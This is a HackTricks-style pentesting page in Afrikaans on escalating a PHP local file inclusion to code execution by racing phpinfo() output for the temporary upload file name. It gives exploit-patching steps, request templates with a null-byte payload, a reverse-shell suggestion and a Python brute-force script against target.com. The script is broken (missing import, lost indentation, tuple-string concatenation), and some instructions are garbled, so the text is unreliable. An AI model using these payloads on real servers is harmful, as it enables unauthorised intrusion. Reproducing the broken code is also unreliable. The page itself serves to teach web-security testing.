{{#include ../../banners/hacktricks-training.md}}

Om hierdie kwesbaarheid te benut, benodig jy: **'n LFI kwesbaarheid, 'n bladsy waar phpinfo() vertoon word, "file_uploads = on" en die bediener moet in die "/tmp" gids kan skryf.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

Jy moet die eksploitasie regmaak (verander **=>** na **=>**). Om dit te doen, kan jy:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
U moet ook die **payload** aan die begin van die exploit verander (byvoorbeeld vir 'n php-rev-shell), die **REQ1** (dit moet na die phpinfo-bladsy wys en die padding ingesluit hê, d.w.s.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), en **LFIREQ** (dit moet na die LFI kwesbaarheid wys, d.w.s.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Kontroleer die dubbele "%" wanneer jy null char exploiteer)

{% file src="../../images/LFI-With-PHPInfo-Assistance.pdf" %}

### Teorie

As opgelaai word in PHP toegelaat en jy probeer om 'n lêer op te laai, word hierdie lêers in 'n tydelike gids gestoor totdat die bediener klaar is met die verwerking van die versoek, dan word hierdie tydelike lêers verwyder.

As jy 'n LFI kwesbaarheid in die webbediener gevind het, kan jy probeer om die naam van die tydelike lêer wat geskep is te raai en 'n RCE te exploiteer deur toegang te verkry tot die tydelike lêer voordat dit verwyder word.

In **Windows** word die lêers gewoonlik gestoor in **C:\Windows\temp\php**

In **linux** was die naam van die lêer gewoonlik **random** en geleë in **/tmp**. Aangesien die naam random is, is dit nodig om **van êrens die naam van die tydelike lêer te onttrek** en toegang te verkry voordat dit verwyder word. Dit kan gedoen word deur die waarde van die **variabele $\_FILES** binne die inhoud van die funksie "**phpconfig()**" te lees.

**phpinfo()**

**PHP** gebruik 'n buffer van **4096B** en wanneer dit **vol** is, word dit **na die kliënt gestuur**. Dan kan die kliënt **'n groot aantal groot versoeke stuur** (met groot koptekste) **wat 'n php** omgekeerde **shell oplaai**, wag vir die **eerste deel van die phpinfo() om teruggestuur te word** (waar die naam van die tydelike lêer is) en probeer om **toegang tot die tydelike lêer te verkry** voordat die php-bediener die lêer verwyder deur 'n LFI kwesbaarheid te exploiteer.

**Python-skrip om te probeer om die naam te bruteforce (as lengte = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{{#include ../../banners/hacktricks-training.md}}
